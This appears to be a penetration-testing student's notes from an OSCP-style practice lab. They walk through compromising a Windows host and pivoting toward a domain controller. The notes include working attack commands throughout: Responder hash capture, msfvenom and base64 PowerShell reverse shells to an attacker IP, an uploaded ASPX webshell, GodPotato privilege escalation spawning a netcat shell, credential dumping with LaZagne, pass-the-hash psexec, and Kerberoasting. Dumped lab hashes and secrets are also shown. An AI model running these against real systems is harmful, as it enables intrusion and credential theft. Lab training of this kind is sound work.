@@ -1,0 +1,2642 @@
+				OSCP-B
+--------------------------------------------------------------------------------------------------
+                                # IPS:
+# INTERNAL 
+10.10.114.146 - DC01 
+10.10.114.148 - MS02 
+
+# EXTERNAL
+192.168.154.147 - MS01
+192.168.154.149 - Kiero 
+192.168.154.150 - Berlin 
+192.168.154.151 - Gust
+--------------------------------------------------------------------------------------------------
+                                       AD SET:
+--------------------------------------------------------------------------------------------------
+				192.168.214.147 - MS01
+FTP: 21
+SSH: 22
+HTTP: 5985 8000 8080 8443 47001
+RPC: 135
+SMB: 139 445
+				NMAP: TCP
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.147
+
+FTP: 21
+21/tcp    open  ftp           syn-ack Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+
+SSH: 22
+22/tcp    open  ssh           syn-ack OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHi6qqQGQteAgLLakGf2MPORvtZSeF1gAL03sfUo/E/jsObuAOjzHPfw1OIfAyctU/gv17d0sz17kGDXbg4In4vxlnavXxnB/L2ipQLhAkFLo1YZLLwyUs0j1jiSW65Ax12A20nH0F3hbuqKsuWIPywR9XXc0cwhyY3ET06ZCbVVvP8ChGMd97uZTDeZtrnskYMXmqnfQpOGPL6e022+K5ud3MboyYXTlD0rGyVHyLCCXeg9QdxsVR5mZ8hSVCrwdX8Q4tb4kLYi+wpPx1KCirHEk/8O8I7YuA5KR4AeaMVSlqUhlm9MXaNw+5WZD2xOue0ZPCx2gxgKgndoUDfAagZrHr3dzgMUDgUnKTbtL/EIZdyzKh5C1TrN+yplSpqYjK975Q1qas7SUmzanN9S/PnhFFer/0j6hTtGlRalbxX12i2ifC0314ifnHY3Zz+2VD49RARArwvZR+7KcGKP+5tpCl9IyVf1xSKFFnJ0cQdhuAgJnkCfQXaQLHTzqSbys=
+|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOpOTM37eUD8SUKAqFVSNV8ECDl5yUqV7a41c39cXyPE6EMeNbKxWvQDoTw+WEYArHFAEj3SZbFupIZoZmvjFuA=
+|   256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICyZUVdHOqTpEFyvELlmc7sCN1XFXQo7RdZdTRTPO2uJ
+
+HTTP: 5985 8000 8080 8443 47001
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8000/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: IIS Windows
+8080/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Bad Request
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8443/tcp  open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Bad Request
+| ssl-cert: Subject: commonName=MS01.oscp.exam
+| Subject Alternative Name: DNS:MS01.oscp.exam
+| Issuer: commonName=MS01.oscp.exam
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-11T07:04:43
+| Not valid after:  2023-11-10T00:00:00
+| MD5:   b656:c5ec:8dd7:27e1:6a5d:1215:daab:332e
+| SHA-1: 4431:1a47:ae65:e844:d7a4:30fe:f00c:5b9a:afc8:8b9b
+|_ssl-date: 2024-05-08T04:58:47+00:00; -3s from scanner time.
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+
+RPC: 135
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
+
+SMB: 139 445
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 10577/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 25905/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 14942/udp): CLEAN (Timeout)
+|   Check 4 (port 34321/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-05-08T04:58:36
+|_  start_date: N/A
+|_clock-skew: mean: -2s, deviation: 0s, median: -3s
+
+5040/tcp  open  unknown       syn-ack
+
+
+				NMAP: UDP
+sudo nmap -sU -O 192.168.154.147
+123/udp  open|filtered ntp
+137/udp  open|filtered netbios-ns
+138/udp  open|filtered netbios-dgm
+500/udp  open|filtered isakmp
+1900/udp open|filtered upnp
+4500/udp open|filtered nat-t-ike
+5050/udp open|filtered mmcc
+5353/udp open|filtered zeroconf
+5355/udp open|filtered llmnr
+
+
+				FTP: 21
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.214.147      
+Connected to 192.168.214.147.
+220 Microsoft FTP Service
+Name (192.168.214.147:kali): anonymous
+331 Password required
+Password: 
+530 User cannot log in.
+ftp: Login failed
+
+				SMB: 139 445
+enum4linux -n 192.168.214.147  
+crackmapexec smb 192.168.214.147  
+smbclient -L \\\\192.168.214.147\\
+
+				RPC: 135
+┌──(kali㉿kali)-[~]
+└─$ rpcdump.py 192.168.214.147 -p 135
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+
+			HTTP: 5985 8000 8080 8443 47001
+http://192.168.214.147:8000/
+http://192.168.214.147:8443/
+http://192.168.214.147:8080/
+http://192.168.214.147:47001/
+
+WORDLISTS:
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/share/seclists/Discovery/Web-Content/common.txt
+
+feroxbuster -u http://192.168.214.147:8000/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+gobuster dir -u http://192.168.178.46/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.178.46/FUZZ -r
+
+dirbuster -u http://192.168.178.46/ -l /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+				/ETC/HOSTS:
+http://192.168.214.147:8080/
+Bad Request - Invalid Hostname
+HTTP Error 400. The request hostname is invalid.
+
+NMAP:
+| ssl-cert: Subject: commonName=MS01.oscp.exam
+| Subject Alternative Name: DNS:MS01.oscp.exam
+| Issuer: commonName=MS01.oscp.exam
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nano /etc/hosts  
+192.168.214.147 MS01.oscp.exam
+
+http://ms01.oscp.exam:8080/
+
+feroxbuster -u http://ms01.oscp.exam:8080/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+http://ms01.oscp.exam:8080/scripts 
+http://ms01.oscp.exam:8080/Content
+403 - Forbidden: Access is denied.
+
+
+				SQLI: 
+Web frameworks
+- Microsoft ASP.NET
+Web servers
+- IIS 10.0
+Operating systems
+- Windows Server
+JavaScript libraries
+- Modernizr 2.8.3
+- jQuery 3.4.1
+UI frameworks
+- Bootstrap 3.4.1
+
+MSSQL: 
+http://ms01.oscp.exam:8080/
+http://ms01.oscp.exam:8080/HOME
+# Testing sqli in every input field: 
+Company Name
+Contact Email
+Url
+';#---
+admin';#
+' OR 1=1;#
+Error.
+An error occurred while processing your request. Sorry.
+
+
+			RESPONDER: UNC path injection
+http://ms01.oscp.exam:8080/
+Company Name: 	admin
+Contact Email: 	admin@oscp.exam
+Url: 		//192.168.45.161/share
+
+┌──(kali㉿kali)-[~]
+└─$ sudo responder -I tun0 -v 
+
+[SMB] NTLMv2-SSP Client   : 192.168.214.147
+[SMB] NTLMv2-SSP Username : OSCP\web_svc
+[SMB] NTLMv2-SSP Hash     : web_svc::OSCP:d2ef4235aad518ba:1CBFD4B50EF989BDE19EB2695C44804E:010100000000000000A605627DA2DA01B0F4A51BD6FACA270000000002000800510036003400380001001E00570049004E002D0054004B003700340037005A0032005A0033003500540004003400570049004E002D0054004B003700340037005A0032005A003300350054002E0051003600340038002E004C004F00430041004C000300140051003600340038002E004C004F00430041004C000500140051003600340038002E004C004F00430041004C000700080000A605627DA2DA0106000400020000000800300030000000000000000000000000300000E78CD6853F7988BC7D4907BCCEEA4040924AB5D263BADCF1E235F21739BC8CEB0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100360031000000000000000000  
+
+				NTLMv2: CRACKING 
+kali@kali:~$ nano web_svc.hash   
+web_svc::OSCP:d2ef4235aad518ba:1CBFD4B50EF989BDE19EB2695C44804E:010100000000000000A605627DA2DA01B0F4A51BD6FACA270000000002000800510036003400380001001E00570049004E002D0054004B003700340037005A0032005A0033003500540004003400570049004E002D0054004B003700340037005A0032005A003300350054002E0051003600340038002E004C004F00430041004C000300140051003600340038002E004C004F00430041004C000500140051003600340038002E004C004F00430041004C000700080000A605627DA2DA0106000400020000000800300030000000000000000000000000300000E78CD6853F7988BC7D4907BCCEEA4040924AB5D263BADCF1E235F21739BC8CEB0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100360031000000000000000000
+
+kali@kali:~$ hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt --force
+Diamond1
+Session..........: hashcat
+Status...........: Cracked
+
+
+				ACCESS: 
+ssh web_svc@192.168.214.147
+Diamond1
+
+oscp\web_svc@MS01 C:\Users\web_svc> whoami                 
+oscp\web_svc                       
+                                   
+oscp\web_svc@MS01 C:\Users\web_svc> hostname
+MS01   
+
+oscp\web_svc@MS01 C:\Users\web_svc> systeminfo                                  
+ERROR: Access denied  
+
+oscp\web_svc@MS01 C:\Users\web_svc>net users
+User accounts for \\MS01
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+Mary.Williams            support                  WDAGUtilityAccount
+
+oscp\web_svc@MS01 C:\Users\web_svc> net users /domain
+The request will be processed at a domain controller for domain oscp.exam.
+User accounts for \\DC01.oscp.exam
+-------------------------------------------------------------------------------
+Administrator            Aimee.Hunt               Carol.Webb
+celia.almeda             Chelsea.Byrne            Donna.Johnson
+Emily.Bishop             Frank.Farrell            Georgina.Begum
+Guest                    Jamie.Thomas             Jane.Booth
+Janice.Turner            Joan.North               john.dorian
+Kenneth.Coles            krbtgt                   Lawrence.Kay
+Leonard.Morris           Linda.Patel              Luke.Martin
+Oliver.Gray              Sandra.Craig             Shane.Mitchell
+sql_svc                  Thomas.Robinson          tom.kinney
+tom_admin                web_svc
+
+
+				NETWORK :
+oscp\web_svc@MS01 C:\Users\web_svc>ipconfig /all
+Windows IP Configuration
+   Host Name . . . . . . . . . . . . : MS01
+   Primary Dns Suffix  . . . . . . . : oscp.exam
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : oscp.exam
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-AB-B5-69
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.214.147(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.214.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+Ethernet adapter Ethernet1:
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
+   Physical Address. . . . . . . . . : 00-50-56-AB-C3-C1
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 10.10.174.147(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+   DNS Servers . . . . . . . . . . . : 10.10.174.146
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+oscp\web_svc@MS01 C:\Users\web_svc> arp -A
+Interface: 192.168.214.147 --- 0x6
+  Internet Address      Physical Address      Type
+  192.168.214.151       00-50-56-ab-11-5c     dynamic   
+  192.168.214.254       00-50-56-ab-04-cd     dynamic
+  192.168.214.255       ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+Interface: 10.10.174.147 --- 0x8
+  Internet Address      Physical Address      Type
+  10.10.174.146         00-50-56-ab-70-ab     dynamic
+  10.10.174.255         ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+
+				CREDS: 
+# LaZagne: 
+iwr -uri http://192.168.45.161:80/LaZagne.exe -Outfile laz.exe
+.\laz.exe all
+[+] 0 passwords have been found.
+
+#Powershell password hunting:
+PS C:\Users\web_svc> (Get-PSReadlineOption).HistorySavePath
+C:\Users\web_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 
+PS C:\Users\web_svc> type C:\Users\web_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLin
+e\ConsoleHost_history.txt
+
+
+			FILES OF INTEREST: NOTHING 
+Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force
+Get-ChildItem -Path C:\ -Include *.aspx -File -Recurse -ErrorAction SilentlyContinue -Force
+
+
+				PRIV ESC: 
+oscp\web_svc@MS01 C:\Users\web_svc> whoami /priv
+PRIVILEGES INFORMATION
+----------------------                                                   
+Privilege Name                Description                          State  
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+
+
+WINPEAS: 
+iwr -uri http://192.168.45.161:80/winPEASx64.exe -Outfile winpea.exe
+.\winpea.exe
+
+╔══════════╣ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  oscp.exam
+    DefaultUserName               :  celia.almeda
+
+╔══════════╣ Found SSH Files
+File: C:\Users\All Users\ssh\ssh_host_rsa_key.pub
+
+				FTP: 
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ftp web_svc@192.168.214.147
+Connected to 192.168.214.147.
+220 Microsoft FTP Service
+331 Password required
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+229 Entering Extended Passive Mode (|||61333|)
+125 Data connection already open; Transfer starting.
+11-14-22  12:17AM       <DIR>          aspnet_client
+11-10-22  04:53AM       <DIR>          custerr
+11-11-22  12:12AM       <DIR>          ftproot
+11-14-22  01:36AM       <DIR>          history
+11-11-22  12:16AM       <DIR>          logs
+11-14-22  12:17AM       <DIR>          pportal
+11-10-22  04:53AM       <DIR>          temp
+12-01-22  04:26AM       <DIR>          wwwroot
+226 Transfer complete.
+
+You have to find the connection between ftp and the web application and obtain RCE
+Try uploading file onto ftp and access it on webapp is what I mean
+Do you see port 8000 open, Try dropping an aspx webshell under wwwroot
+REMEMBER: If reverse shell dosnt work try CMD 
+
+			aspx reverseshell: DIDNT WORK
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="192.168.45.161" LPORT=2560 -f asp > shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="192.168.45.161" LPORT=2560 -f aspx > shell.aspx
+
+ftp> cd wwwroot
+ftp> put shell.asp
+ftp> ls
+229 Entering Extended Passive Mode (|||61352|)
+125 Data connection already open; Transfer starting.
+11-10-22  04:53AM                  696 iisstart.htm
+11-10-22  04:53AM                98757 iisstart.png
+05-10-24  01:43AM                38230 shell.asp
+
+http://192.168.214.147:8000/
+
+feroxbuster -u http://192.168.214.147:8000/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+http://192.168.214.147:8000/shell.asp
+
+
+			aspx cmdwebshell: WORKED
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
+
+ftp> cd wwwroot
+ftp> put cmdasp.aspx
+ftp> ls
+229 Entering Extended Passive Mode (|||61367|)
+125 Data connection already open; Transfer starting.
+11-10-22  04:53AM                  696 iisstart.htm
+11-10-22  04:53AM                98757 iisstart.png
+05-10-24  01:43AM                38230 shell.asp
+05-10-24  01:50AM                38345 shell.aspx
+05-10-24  01:52AM                 2933 shell2.aspx
+
+http://192.168.214.147:8000/cmdasp.aspx
+
+Command:
+https://www.revshells.com/
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMAAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 2560
+listening on [any] 2560 ...
+connect to [192.168.45.161] from (UNKNOWN) [192.168.214.147] 61369
+
+PS C:\windows\system32\inetsrv> whoami
+iis apppool\defaultapppool
+
+PS C:\windows\system32\inetsrv> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+
+		PRIV ESC: iis apppool\defaultapppool > Administrator
+SeImpersonatePrivilege: 
+
+PrintSpoofer64: 
+iwr -uri http://192.168.45.161:80/PrintSpoofer64.exe -Outfile print.exe
+.\print.exe -i -c powershell.exe
+
+GodPotato: FOR WEBSERVERS ALWAYS USE GODPOTATO
+certutil.exe -urlcache -split -f "http://192.168.45.161/GodPotato-NET4.exe" GodPotato.exe
+certutil.exe -urlcache -split -f "http://192.168.45.161/nc64.exe" nc64.exe
+.\GodPotato.exe -cmd "C:\Users\Public\Downloads\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.161 4444"
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.161] from (UNKNOWN) [192.168.214.147] 61382
+Microsoft Windows [Version 10.0.19044.2251]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Public\Downloads>whoami
+whoami
+nt authority\system
+
+C:\Users\Public\Downloads>powershell -ep bypass
+
+				CREDS: 
+#Powershell password hunting:
+PS C:\Users\Public\Downloads> (Get-PSReadlineOption).HistorySavePath
+C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+PS C:\Users\Public\Downloads> type C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+ne\ConsoleHost_history.txt' because it does not exist.
+
+# LaZagne: 
+iwr -uri http://192.168.45.161:80/LaZagne.exe -Outfile laz.exe
+.\laz.exe all
+
+------------------- Hashdump passwords -----------------
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
+------------------- Pypykatz passwords -----------------
+[+] Shahash found !!!
+Shahash: 90afa30798b082c0d0aae85435421502c254d459
+Nthash: 3c4495bbd678fac8c9d218be4f2bbc7b
+Login: Administrator
+[+] Shahash found !!!
+Shahash: 1759062c619dabe24cf4d8b403dcca41a16fa656
+Nthash: b246c4cf123ad4ceaf4e93adf467af88
+Login: MS01$
+[+] Shahash found !!!
+Shahash: e7f3a3cf293b58a124e1c636a07dae46ff9946ae
+Nthash: 53e938166782a44e241beaf02d081ff6
+Login: web_svc
+------------------- Lsa_secrets passwords -----------------
+$MACHINE.ACC
+0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   C9 5C 44 96 2A B9 06 76 AB 71 92 8B 1D EB 11 B0    ..D.*..v.q......
+0020   E1 E7 66 AA E4 A6 83 AE AF A9 A1 F9 33 41 CA 0D    ..f.........3A..
+0030   25 FB C6 73 E1 DC BB C5 71 B9 11 C3 69 7E A9 CF    %..s....q...i~..
+0040   7C AE A1 97 79 4D 64 0A D0 37 A7 55 AC 37 1F DF    |...yMd..7.U.7..
+0050   A1 79 98 85 93 0E 9E 16 CF 73 01 82 9E C9 FF A9    .y.......s......
+0060   62 E7 13 57 70 FA 7D FE 21 9E 9A F5 22 6C 44 99    b..Wp.}.!..."lD.
+0070   49 27 AB BA 23 B1 49 1A 68 AB D6 BA 61 0D BD 1F    I'..#.I.h...a...
+0080   55 37 E4 6F 66 D3 82 54 27 45 42 9E 28 35 E6 C7    U7.of..T'EB.(5..
+0090   5A 9F 33 DE 05 7D FC 3E AC B0 8B 83 FF 94 0A AF    Z.3..}.>........
+00A0   59 35 B6 0B AF 69 B7 1C 46 AE 85 A5 27 07 C8 BA    Y5...i..F...'...
+00B0   C1 15 94 98 73 03 A1 74 BD 9B D7 46 F4 AC 63 C6    ....s..t...F..c.
+00C0   C0 73 63 5D 9F 11 69 C3 AC A3 FA 1C 71 CF 7A 1B    .sc]..i.....q.z.
+00D0   00 F1 61 CE C2 62 4B 89 EC 02 C9 B3 8C 60 18 09    ..a..bK......`..
+00E0   4A B1 88 F6 9E F1 22 A1 31 E6 BC 10 A2 FE FD AC    J.....".1.......
+00F0   96 E4 FD A5 AA 1C A7 CF DA D8 B6 C6 7F 6A 9B 71    .............j.q
+0100   17 84 85 CD DE D9 53 F7 E0 54 15 DD 53 3F 14 CF    ......S..T..S?..
+DefaultPassword
+0000   1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   37 00 6B 00 38 00 58 00 48 00 6B 00 33 00 64 00    7.k.8.X.H.k.3.d.
+0020   4D 00 74 00 6D 00 70 00 6E 00 43 00 37 00 00 00    M.t.m.p.n.C.7...
+DPAPI_SYSTEM
+0000   01 00 00 00 14 CC 9A CC BB 06 D4 AF 8F 07 29 57    ..............)W
+0010   49 93 3B 06 CF 0D 6D FD 4C 31 EB 80 2E 35 29 D3    I.;...m.L1...5).
+0020   4F 19 8A 04 73 A6 74 5C F5 94 85 27                O...s.t....'
+NL$KM
+0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
+0010   F1 9F 8D 0A 3D 6B 2D 13 69 96 2E 4C 32 4D C3 66    ....=k-.i..L2M.f
+0020   D5 36 97 AB 1F 0B F2 38 11 3E DF 05 AE DF 31 70    .6.....8.>....1p
+0030   C0 E3 97 A0 08 31 A9 2A E3 88 48 DD 2C 88 86 56    .....1.*..H.,..V
+0040   83 C9 79 90 03 D5 9D 28 C1 BE 33 D6 0E 7B B7 9B    ..y....(..3..{..
+0050   76 FF 4E 76 F0 C3 6D 1D 2B 88 24 F9 96 B9 0E A1    v.Nv..m.+.$.....
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 38270e6e-a515-4984-aaf7-b8f858a922a6
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 7c143b8a-2090-46f4-a97e-b7118c314ddb
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 88fc78fb-94d7-4ac8-9781-7f6e67b20483
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey a8234e84-0f0c-4bc5-b27c-ea97a4be8628
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey d976c605-e232-4c02-9c33-c5be484210f7
+[+] 3 passwords have been found.
+
+
+				SAM SYSTEM : 
+PS C:\Users\Public\Downloads> Get-ChildItem -Path C:\ -Include SAM -File -Recurse -ErrorAction Silently
+Continue
+    Directory: C:\Windows\System32\config
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          3/2/2023   1:57 AM          65536 SAM   
+
+PS C:\Users\Public\Downloads> Get-ChildItem -Path C:\ -Include SYSTEM -File -Recurse -ErrorAction Silently Continue
+    Directory: C:\Windows\System32\config
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          3/2/2023   1:57 AM       13631488 SYSTEM  
+
+
+
+				ACCESS: 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
+
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b Administrator@192.168.156.147
+
+NOT WRITABLE: 
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e Mary.Williams@192.168.214.147
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071 support@192.168.214.147
+
+				PORT FORWARD: 
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+
+python3 -m http.server 80
+iwr -uri http://192.168.45.161:80/agent.exe -Outfile agent.exe
+./agent -connect 192.168.45.161:11601 -ignore-cert
+
+session 
+1
+ipconfig
+10.10.174.147
+
+sudo ip route add 10.10.116.0/24 dev ligolo
+ip route
+[Agent : dev@oscp] » start
+
+
+				ASREP ROAST: 
+┌──(kali㉿kali)-[~]
+└─$  impacket-GetNPUsers -dc-ip 10.10.174.146 -outputfile hashes.asreproast -request oscp.exam/web_svc
+Password: Diamond1
+Password:
+No entries found!
+┌──(kali㉿kali)-[~]
+└─$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
+
+				KERB ROAST: 
+┌──(kali㉿kali)-[~]
+└─$ impacket-GetUserSPNs -request -dc-ip 10.10.174.146 oscp.exam/web_svc:Diamond1
+ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
